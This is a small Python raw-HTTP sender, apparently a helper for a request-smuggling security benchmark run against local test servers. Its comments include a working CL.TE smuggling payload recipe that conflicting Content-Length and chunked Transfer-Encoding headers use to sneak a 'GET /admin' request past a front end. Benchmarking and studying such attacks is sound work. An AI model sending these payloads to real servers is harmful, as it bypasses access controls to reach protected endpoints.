import socket, sys, time
# Raw HTTP sender for arm-C2 request-smuggling benches (XBOW smuggling_desync class).
# Sends the EXACT bytes of <reqfile> to <host>:<port> and prints the raw response,
# WITHOUT normalizing Content-Length / Transfer-Encoding (curl cannot do this) ->
# required to transmit CL.TE / TE.CL smuggling payloads byte-for-byte.
#
# Usage:  python raw.py <reqfile> <port> [timeout_seconds] [host]
#   <reqfile> : binary file holding the exact request bytes. Build it in python with
#               real CRLFs and Content-Length = len(body), e.g.:
#                 body=b'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost:PORT\r\n\r\n'
#                 open('req.bin','wb').write(b'POST / HTTP/1.1\r\nHost: localhost:PORT\r\n'
#                   b'Content-Length: '+str(len(body)).encode()+b'\r\nTransfer-Encoding: chunked\r\n\r\n'+body)
#   <port>    : target port from build_target.py (varies per bench).
#   timeout   : seconds to wait for the response (default 5; raise it for request-capture).
#   host      : default 127.0.0.1.
if len(sys.argv) < 3:
    sys.exit("Usage: python raw.py <reqfile> <port> [timeout] [host]")
reqfile = sys.argv[1]
port    = int(sys.argv[2])
timeout = float(sys.argv[3]) if len(sys.argv) > 3 else 5.0
host    = sys.argv[4] if len(sys.argv) > 4 else "127.0.0.1"
data = open(reqfile, "rb").read()
sys.stdout.write("--- SENDING %d bytes to %s:%d ---\n%r\n--- RESPONSE ---\n" % (len(data), host, port, data))
s = socket.create_connection((host, port), timeout=timeout)
t0 = time.time()
s.sendall(data)
chunks = []
try:
    while True:
        b = s.recv(65535)
        if not b:
            break
        chunks.append(b)
except socket.timeout:
    sys.stdout.write("[socket timeout after %.1fs -> server kept connection open / waited for more body]\n" % timeout)
resp = b"".join(chunks)
sys.stdout.write(resp.decode("latin-1"))
sys.stdout.write("\n--- elapsed %.3fs, %d bytes received ---\n" % (time.time() - t0, len(resp)))
s.close()
